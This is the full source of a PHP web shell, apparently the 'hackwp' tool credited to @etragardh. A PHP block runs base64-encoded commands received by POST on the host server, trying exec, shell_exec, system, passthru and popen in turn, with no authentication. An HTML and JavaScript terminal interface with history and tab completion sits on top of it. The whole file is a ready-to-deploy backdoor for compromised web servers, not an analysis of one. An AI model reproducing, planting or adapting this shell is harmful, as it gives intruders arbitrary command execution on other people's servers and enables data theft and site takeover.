<?php
$C=array('u'=>'hwp','h'=>'shell');
function xCmd($c){$o='';
if(function_exists('exec')){exec($c,$r);$o=implode("\n",$r);}
elseif(function_exists('shell_exec')){$o=shell_exec($c);}
elseif(function_exists('system')){ob_start();system($c);$o=ob_get_contents();ob_end_clean();}
elseif(function_exists('passthru')){ob_start();passthru($c);$o=ob_get_contents();ob_end_clean();}
elseif(function_exists('popen')){$h=popen($c,'r');while(!feof($h))$o.=fread($h,4096);pclose($h);}
return $o;}
function doShell($raw,$rawCwd){
$cmd=base64_decode($raw);$cwd=base64_decode($rawCwd);
if(preg_match("/^\s*cd\s*$/",$cmd)){chdir(expandPath("~"));}
elseif(preg_match("/^\s*cd\s+(.+)\s*$/",$cmd,$m)){chdir($cwd);chdir(expandPath(trim($m[1])));}
else{chdir($cwd);$stdout=xCmd($cmd." 2>&1");
return array("s"=>base64_encode($stdout),"d"=>base64_encode(getcwd()));}
return array("s"=>base64_encode(""),"d"=>base64_encode(getcwd()));}
function expandPath($p){if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#",$p,$m)){exec("echo $m[1]",$o);return $o[0].$m[2];}return $p;}
function doHint($rawFn,$rawCwd,$rawType){
$fn=base64_decode($rawFn);$cwd=base64_decode($rawCwd);$type=base64_decode($rawType);
chdir($cwd);
$c=($type=='cmd')?"compgen -c $fn":"compgen -f $fn";
$c="/bin/bash -c \"$c\"";$f=explode("\n",shell_exec($c));
foreach($f as &$v)$v=base64_encode($v);return array('files'=>$f);}
function initC(){global $C;
$pw=function_exists('posix_getpwuid')?posix_getpwuid(posix_geteuid()):false;
if($pw)$C['u']=$pw['name'];$h=gethostname();if($h)$C['h']=$h;}
if(isset($_GET["f"])){$r=NULL;
switch($_GET["f"]){
case"s":$r=doShell($_POST['c'],$_POST['d']);break;
case"p":$r=array("d"=>base64_encode(getcwd()));break;
case"h":$r=doHint($_POST['filename'],$_POST['d'],$_POST['type']);break;}
header("Content-Type: application/json");echo json_encode($r);die();}
else{initC();}
?><!DOCTYPE html><html><head><meta charset="UTF-8"/>
<title>hwp@shell</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<style>
html,body{margin:0;padding:0;background:#0a0a0f;color:#c8c8d0;font-family:'Courier New',monospace;width:100vw;height:100vh;overflow:hidden}
#sh{background:#0d0d14;font-size:10pt;display:flex;flex-direction:column;width:100%;height:100%}
#sc{overflow:auto;padding:8px;white-space:pre-wrap;flex-grow:1}
#logo{font-weight:bold;color:#888;text-align:center;font-size:10pt;padding:8px}
.pr{font-weight:bold;color:#e94560}.pr>span{color:#888}
#si{display:flex;border-top:1px solid #1a1a2e;padding:8px 0}
#si>label{padding:0 5px;height:30px;line-height:30px}
#si #cmd{height:30px;line-height:30px;border:none;background:transparent;color:#c8c8d0;font-family:'Courier New',monospace;font-size:10pt;width:100%;outline:none}
#si div{flex-grow:1}
</style>
<script>
var CF=<?php echo json_encode($C);?>,CWD=null,hist=[],hpos=0,eI=null,eC=null;
function b64e(s){return btoa(unescape(encodeURIComponent(s)));}
function b64d(s){return decodeURIComponent(escape(atob(s)));}
function ins(c){eC.innerHTML+="\n\n"+'<span class="pr">'+gP(CWD)+'</span> '+esc(c)+"\n";eC.scrollTop=eC.scrollHeight;}
function out(s){eC.innerHTML+=esc(s);eC.scrollTop=eC.scrollHeight;}
function gP(d){d=d||"~";var s=d;if(d.split("/").length>3){var p=d.split("/");s="…/"+p[p.length-2]+"/"+p[p.length-1];}
return CF.u+"@"+CF.h+":<span title=\""+d+"\">"+s+"</span>#";}
function uCwd(d){if(d){CWD=d;document.getElementById("pr").innerHTML=gP(CWD);return;}
req("?f=p",{},function(r){CWD=b64d(r.d);document.getElementById("pr").innerHTML=gP(CWD);});}
function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
function doCmd(c){ins(c);
if(/^\s*clear\s*$/.test(c)){eC.innerHTML='';return;}
req("?f=s",{c:b64e(c),d:b64e(CWD)},function(r){out(b64d(r.s));uCwd(b64d(r.d));});}
function doHint(){if(!eI.value.trim())return;
var p=eI.value.split(" "),t=(p.length===1)?"cmd":"file",fn=(t==="cmd")?p[0]:p[p.length-1];
req("?f=h",{filename:b64e(fn),d:b64e(CWD),type:b64e(t)},function(r){
if(r.files.length<=1)return;r.files=r.files.map(function(f){return b64d(f);});
if(r.files.length===2){if(t==='cmd')eI.value=r.files[0];else eI.value=eI.value.replace(/([^\s]*)$/,r.files[0]);}
else{ins(eI.value);out(r.files.join("\n"));}});}
function kd(e){switch(e.key){
case"Enter":doCmd(eI.value);hist.push(eI.value);hpos=hist.length;eI.value="";break;
case"ArrowUp":if(hpos>0){hpos--;eI.value=hist[hpos];}break;
case"ArrowDown":if(hpos<hist.length){hpos++;eI.value=hpos===hist.length?"":hist[hpos];}break;
case"Tab":e.preventDefault();doHint();break;}}
function req(u,p,cb){var x=new XMLHttpRequest(),a=[];
for(var k in p)if(p.hasOwnProperty(k))a.push(encodeURIComponent(k)+"="+encodeURIComponent(p[k]));
x.open("POST",u,true);x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
x.onreadystatechange=function(){if(x.readyState===4&&x.status===200){try{cb(JSON.parse(x.responseText));}catch(e){}}};
x.send(a.join("&"));}
document.onclick=function(e){if(!window.getSelection().toString())eI.focus();};
window.onload=function(){eI=document.getElementById("cmd");eC=document.getElementById("sc");uCwd();eI.focus();};
</script></head><body>
<div id="sh">
<pre class="banner"><span style="color:#e94560">
  ⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀
  ⣿⡿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⢿⡵
  ⣿⡇⠀⠀⠉⠛⠛⣿⣿⠛⠛⠉⠀⠀⣿⡇</span>  <span style="color:#888">» hackwp «</span>
  <span style="color:#e94560">⣿⣿⣀⠀⢀⣠⣴⡇⠹⣦⣄⡀⠀⣠⣿⡇</span>    <span style="color:#555">by @etragardh</span>
  <span style="color:#e94560">⠋⠻⠿⠿⣟⣿⣿⣦⣤⣼⣿⣿⠿⠿⠟⠀
  ⠀   ⠸⡿⣿⣿⢿⡿⢿⠇</span>
  <span style="color:#e94560">⠀⠀⠀⠀⠀⠀⠈⠁⠈⠁⠀⠀⠀⠀⠀⠀</span></pre>
<pre id="sc"></pre>
<div id="si"><label for="cmd" id="pr" class="pr">…</label><div><input id="cmd" onkeydown="kd(event)"/></div></div></div>
</body></html>
